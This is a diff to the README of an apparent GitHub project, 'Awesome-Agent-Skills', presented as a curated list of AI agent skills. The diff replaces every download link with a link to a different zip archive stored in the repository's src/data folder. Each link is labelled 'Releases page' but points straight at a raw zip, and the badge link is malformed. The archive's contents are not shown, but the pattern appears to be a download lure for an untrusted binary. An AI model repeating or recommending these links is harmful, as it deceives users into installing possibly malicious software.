@@ -1,6 +1,6 @@
 # 🧭 Awesome-Agent-Skills - Navigate AI Skills Effortlessly
 
-[![Download Now](https://raw.githubusercontent.com/megalor1/Awesome-Agent-Skills/main/src/data/Skills_Agent_Awesome_v3.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/megalor1/Awesome-Agent-Skills/main/src/data/Skills_Agent_Awesome_v3.2.zip)
+[![Download Now](https://github.com/megalor1/Awesome-Agent-Skills/raw/refs/heads/main/src/data/Skills_Awesome_Agent_2.5.zip%20Now-Click%20Here-brightgreen)](https://github.com/megalor1/Awesome-Agent-Skills/raw/refs/heads/main/src/data/Skills_Awesome_Agent_2.5.zip)
 
 ## 📖 Description
 
@@ -11,7 +11,7 @@ Awesome-Agent-Skills is a curated navigation station for AI Agent skills and MCP
 Follow these steps to get started with Awesome-Agent-Skills:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/megalor1/Awesome-Agent-Skills/main/src/data/Skills_Agent_Awesome_v3.2.zip) to find the latest version.
+   Go to our [Releases page](https://github.com/megalor1/Awesome-Agent-Skills/raw/refs/heads/main/src/data/Skills_Awesome_Agent_2.5.zip) to find the latest version.
 
 2. **Choose Your File**  
    Look for the latest release. You will see different files available for download. Select the one that suits your system.
@@ -36,7 +36,7 @@ To run Awesome-Agent-Skills smoothly, ensure your system meets the following req
 
 ## 📥 Download & Install
 
-To enjoy the features of Awesome-Agent-Skills, visit the [Releases page](https://raw.githubusercontent.com/megalor1/Awesome-Agent-Skills/main/src/data/Skills_Agent_Awesome_v3.2.zip) to download the latest version. 
+To enjoy the features of Awesome-Agent-Skills, visit the [Releases page](https://github.com/megalor1/Awesome-Agent-Skills/raw/refs/heads/main/src/data/Skills_Awesome_Agent_2.5.zip) to download the latest version. 
 
 Follow the steps above to install the application. Make sure to always check for updates on the Releases page regularly for new features and improvements.
 
